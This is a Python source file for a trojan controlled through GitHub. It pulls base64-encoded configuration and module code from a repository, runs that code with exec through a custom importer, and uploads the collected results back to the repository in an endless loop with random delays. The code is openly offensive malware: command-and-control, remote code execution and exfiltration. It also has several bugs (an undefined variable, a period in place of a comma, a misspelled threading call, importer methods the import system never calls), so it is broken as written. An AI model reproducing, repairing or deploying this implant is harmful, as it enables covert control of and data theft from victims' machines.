import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def connectToGithub():

	with open('mytoken.txt', 'r') as f:
		token = f.read()

	user = 'Z2l0aHVi-TEST'
	sess = github3.login(token = token)
	return sess.repository(usr, 'gitControlledTrojan')

def getFileContents(dirname, module_name, repo):

	return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:

	def __init__(self, id0):

		self.id0 = id0
		self.config_file = f'{id0}.json'
		self.data_path = f'data/{id0}/'
		self.repo = connectToGithub()

	def getConfig(self):

		config_json = getFileContents('config', self.config_file, self.repo)
		config = json.loads(base64.b64decode(config_json))

		for task in config:
			if task['module'] not in sys.modules:
				exec(f"import {task['module']}")
		return config

	def moduleRunner(self, module):

		result = sys.modules[module].run()
		self.storeModuleResult(result)

	def storeModuleResult(self, data):

		curr_time = datetime.now().isoformat()
		remote_path = f'data/{self.id0}/{curr_time}.data'
		bindata = bytes('%r' % data, 'utf-8')
		self.repo.create_file(remote_path. curr_time, base64.b64encode(bindata))

	def run(self):

		while True:

			config = self.getConfig()
			for task in config:
				thread = threading.Tread(target = self.moduleRunner, args = (task['module'],))
				thread.start()
				time.sleep(random.randint(1, 10))
			time.sleep(10)

class GitImporter:

	def __init__(self):

		self.current_module_code = ''

	def findModule(self, name, path = None):

		print(f"[+] Attempting to retrieve {name}...")
		self.repo = connectToGithub()
		new_library = getFileContents('modules', f"{name}.py", self.repo)

		if new_library is not None:
			self.current_module_code = base64.b64decode(new_library)
			return self

	def loadModule(self, name):

		spec = importlib.util.spec_from_loader(name, loader = None, origin = self.repo.git_url)
		new_module = importlib.util.module_from_spec(spec)
		exec(self.current_module_code, new_module.__dict__)
		sys.modules[spec.name] = new_module
		return new_module

if __name__ == '__main__':
	
	sys.meta_path.append(GitImporter())
	trojan = Trojan('abc')
	trojan.run()